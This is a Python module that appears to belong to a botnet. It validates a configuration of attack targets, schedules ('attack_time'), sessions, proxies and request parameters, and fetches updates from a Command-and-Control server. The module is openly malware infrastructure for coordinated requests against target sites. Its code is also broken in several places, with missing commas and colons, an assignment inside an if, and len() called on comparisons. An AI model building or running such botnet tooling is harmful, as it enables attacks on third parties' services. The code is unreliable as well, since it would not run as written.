"""
This is the set of functions built with the aim to provide a simple
interface for the configuration management for the botnet instance.
It will provide access to the Command-and-Control server as well as
the validation for the configuration dictionary.

Created:    29 December 2016
Modified:   29 December 2016
"""

import json
import requests
from time import time

def validateConfigFile(config_file):
    """
    This utility is the entry point for every configuration 
    validation. It requires a configuration file to be passed 
    to be validated via C&C and using a particular schema 

    @param config_file, string - path to the configuration .txt or .json
    @return configuration, dictionary or None if error occurs
    """
    # presetting the root schema for the configuration dictionary
    # (default values provided for startup routine)
    rootSchema = {
        "last_modified" : round(time()),
        "cc_server"     : "",
        "user-agent_b"  : "ALLSAFE_UADEFAULT",
        "log_file"      : "../log.txt",

        "targets"       : []
    }
    # presetting the target schema for the configuration dictionary
    targetSchema = {
        "period"            : 1,
        "max_count"         : 1,
        "action_conditions" : { "AM" : 1, "PM" : 1, "attack_time" : "0-24", "avoid_week" : [], "avoid_month" : [] }
        "request_params"    : {},
        "sessions"          : 1
    }
    # presetting the request_params schema for the configuration dictionary
    requestSchema = {
        "method"        : "GET",
        "url"           : "",
        "proxy_server"  : { "http" : "", "https" : "" }
        "user-agent"    : "",
        "encoding"      : "UTF-8",
        "payload"       : {},
        "response"      : "raw",
        "response-header" : 0
    }

    # retrieving configuration file
    configuration = {}
    try:
        configuration = json.load(open(config_file))
        # if configuration file does not exist... we return None.
    except (FileNotFoundError, IOError) as error:
        return None

    # 0. compare root schema 
    if configuration.keys() != rootSchema.keys():
        return None
    # set to default
    if len(configuration['user-agent_b']) == 0:
        configuration['user-agent_b'] = rootSchema['user-agent_b'] 
    if len(configuration['log_file']) == 0:
        configuration['log_file'] = rootSchema['log_file']
    if len(configuration['targets'] == 0):
        configuration['targets'] = rootSchema['targets']

    # 1. check for updates connecting to C&C
    if len(configuration['cc_server'] != 0):
         configuration = validateCCUpdate(configuration['cc_server'], rootSchema)
    
    # 2. compare target schema
    targetList = configuration['targets']
    if len(targetList) = 0:
        return configuration
    else:
        for i in range(0, len(targetList)):
            target = targetList[i]
            # check for schema - only few params are necessary!
            if not set(target.keys()).issubset(set(targetSchema.keys()))
                return None
            # check for custom values to be polished or set to default
            if (target['period'] < 0) or ('period' not in target):
                target['period'] = targetSchema['period']
            if (target['max_count'] <= 0) or ('max_count' not in target):
                target['max_count'] = targetSchema['max_count']
            if (target['sessions'] <= 0) or ('sessions' not in target):
                target['sessions'] = targetSchema['sessions']
            # check for action conditions
            target = validateActionConditions(target, targetSchema)

            # 2.1. compare request schema
            if 'request_params' not in target:
                return None
            req = validateRequestParams(target['request_params'], requestSchema)
            # if no url has been setted as a target...
            if req is None:
                return None
            # else we set default request params
            target['request_params'] = req

    return configuration